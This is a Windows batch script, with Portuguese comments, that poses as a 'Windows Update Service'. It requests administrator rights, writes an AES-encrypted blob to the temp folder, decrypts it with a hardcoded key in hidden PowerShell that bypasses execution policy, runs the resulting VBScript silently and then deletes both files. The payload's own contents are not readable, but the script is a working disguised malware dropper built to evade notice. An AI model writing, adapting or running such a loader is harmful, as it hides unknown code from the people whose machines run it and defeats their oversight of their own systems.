@echo off
setlocal EnableDelayedExpansion
title Windows Update Service

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

echo [*] Inicializando componentes...

set "pfKAfz=%TEMP%\Fjz0R.txt"
set "sMlXqI=%TEMP%\DTAny.vbs"

:: Salva os dados criptografados em um arquivo de texto
echo IWpuJY+tr9w7YrGVYpZwzP4AAqYgX0HHOlUUZ+vnTUalramEnyH72fXRTKDx6+B8LyTdc9xmOeMbrWfhNBX4rIKCwjMeWEdGtsQN+9xlrM7vpsJhp5hQx0QFkrFM7bNsjQlmloD/q984WJR/3HcI0BDsGqynTqnOO7+zxmOabiOVU2qAIcRg+HQwqAdBJdg66qQfhAipVzUTg1X+jxsTG2nJQUMsmwJjXsh4OMDC7vf4KtfHvqZo9sogNa5/cakbxbqPDV6q64EfhrDHJU7oUAHOoL7oCBxOIjGCe45EasPc5ZOqXquAJgv68YOyM22+h++jxoHkINy+oADrEDWblNR9rw1qhqrPuuxDEkqYD/turSfV2OSDIFcvxR2aOa6cOgpKj7LaMIpXGJXz14/6rYjkc+oJPhUQY0VuksU6xZXnH6cH7oGWgmUTMwFvBic1X1WjFMgsX8HC5OokFke5jjahFgd/arpgqz8Ny+kr9/Zh5iFszhXycG7SbFFwybRVAX5GNFV164ZmvhS6unHOs0iB/QhdUXMKOTaFJxquYKSNPI7JMKXyyoXIIwgIuMcRJWdB1Zgk1aWrdg8JyFUNx/YjVDGDDVe6q9+bf7sSZhph3xgC3V/ELkdZ657KfnvMzj36+J9vfZOFSfuoDG571Bp4QbMep7ZKfSTBid0DE15gUG0ng5ZZMF7L0mhBbQBF5H9moLyhoN8C8ag+4fH2lKQ7FDIxtwJAD2UOZC4p/V+prCgVYqrmkoeTHCSapme1Z2qYPbY6kNenXIoN4wFCpNxyuGDwrq8h7qW/WsGuT8zlgPTNoNZg2ShNyI5ttfW57mybqmUcIAsWjimQONGHev89Q7veE2xBiFlThWr+D+FqlyHxsyQSzroQ+/CI5zUG > "%pfKAfz%"

:: O PowerShell apenas descriptografa o VBS e salva no disco
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
    "$k=[Convert]::FromBase64String('uNw4A6o1/enqm6D/0l8sVSs2Y2JrwrQaSnpPvOWXh7A=');" ^
    "$iv=[Convert]::FromBase64String('oi0/Cbastt7NJWM3BKXz8A==');" ^
    "$d=[Convert]::FromBase64String((Get-Content -Raw -Path '%pfKAfz%'));" ^
    "$aes=[System.Security.Cryptography.Aes]::Create();" ^
    "$aes.Key=$k; $aes.IV=$iv;" ^
    "$dec=$aes.CreateDecryptor();" ^
    "$ms=New-Object System.IO.MemoryStream(,$d);" ^
    "$cs=New-Object System.Security.Cryptography.CryptoStream($ms,$dec,[System.Security.Cryptography.CryptoStreamMode]::Read);" ^
    "$sr=New-Object System.IO.StreamReader($cs);" ^
    "[System.IO.File]::WriteAllText('%sMlXqI%', $sr.ReadToEnd());" ^
    "$cs.Close(); $ms.Close()"

:: Roda o VBScript silenciosamente
cscript //nologo //B "%sMlXqI%"

:: Limpeza
ping -n 3 127.0.0.1 >nul
del /f /q "%pfKAfz%" >nul 2>&1
del /f /q "%sMlXqI%" >nul 2>&1
exit
